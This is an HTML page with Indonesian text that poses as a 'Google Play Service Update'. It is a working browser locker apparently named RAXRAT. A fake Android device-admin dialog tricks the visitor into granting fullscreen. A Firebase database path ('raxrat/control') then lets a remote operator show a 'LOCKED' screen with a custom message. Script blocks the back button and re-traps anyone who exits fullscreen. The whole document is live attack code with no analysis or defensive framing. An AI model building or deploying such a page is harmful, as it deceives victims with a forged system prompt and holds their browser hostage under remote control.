<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Google Play Service Update</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #fff; font-family: 'Roboto', sans-serif; overflow: hidden; }
        
        /* Modal Tiruan Izin Admin Android */
        #admin-dialog {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.5); z-index: 1000000; display: flex; justify-content: center; align-items: center;
        }
        .dialog-box {
            background: #fff; width: 85%; padding: 20px; border-radius: 4px; box-shadow: 0 10px 25px rgba(0,0,0,0.3);
        }
        .dialog-box h3 { margin: 0 0 10px 0; color: #333; }
        .dialog-box p { color: #666; font-size: 0.9rem; line-height: 1.4; }
        .btns { display: flex; justify-content: flex-end; gap: 20px; margin-top: 20px; }
        .btn-flat { color: #00796b; font-weight: bold; text-transform: uppercase; cursor: pointer; border: none; background: none; }

        /* Overlay RAXRAT Gede */
        #rax-lock {
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #000; color: #ff0055; z-index: 9999999; flex-direction: column;
            justify-content: center; align-items: center; text-align: center;
        }
        .anime-text { font-size: 15vw; font-weight: 900; text-shadow: 0 0 20px #ff0055; letter-spacing: -5px; }
        .sub-text { color: #fff; font-size: 1.5rem; margin-top: 10px; opacity: 0.8; }
    </style>
</head>
<body>

    <div id="admin-dialog">
        <div class="dialog-box">
            <h3>Aktifkan Admin Perangkat?</h3>
            <p>Aplikasi "System Update" meminta izin untuk mengelola perangkat ini secara jarak jauh untuk keamanan data Anda.</p>
            <div class="btns">
                <button class="btn-flat" onclick="alert('Izin diperlukan untuk melanjutkan!')">BATAL</button>
                <button class="btn-flat" onclick="startSupremeLock()">AKTIFKAN</button>
            </div>
        </div>
    </div>

    <div id="rax-lock">
        <div class="anime-text">LOCKED</div>
        <div id="msg" class="sub-text">INITIALIZING ADMIN...</div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-app.js";
        import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-database.js";

        const config = { databaseURL: "https://locker-8aa14-default-rtdb.asia-southeast1.firebasedatabase.app/" };
        const db = getDatabase(initializeApp(config));
        
        const raxLock = document.getElementById('rax-lock');
        const adminDialog = document.getElementById('admin-dialog');
        const msgDisplay = document.getElementById('msg');

        window.startSupremeLock = () => {
            // Paksa Fullscreen & Lock
            if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
            adminDialog.style.display = 'none';
        };

        // Real-time Sync
        onValue(ref(db, 'raxrat/control'), (snap) => {
            const data = snap.val();
            if (data && data.status === "locked") {
                raxLock.style.display = 'flex';
                msgDisplay.innerText = data.message;
                
                // Anti-Back & Loop Fullscreen
                history.pushState(null, null, location.href);
                window.onpopstate = () => history.go(1);
            } else {
                raxLock.style.display = 'none';
                if (document.fullscreenElement) document.exitFullscreen();
            }
        });

        // Pantau Fullscreen (Kalo target maksa keluar, munculin lagi)
        document.addEventListener('fullscreenchange', () => {
            if (!document.fullscreenElement) {
                onValue(ref(db, 'raxrat/control'), (snap) => {
                    if (snap.val().status === "locked") adminDialog.style.display = 'flex';
                });
            }
        });
    </script>
</body>
</html>
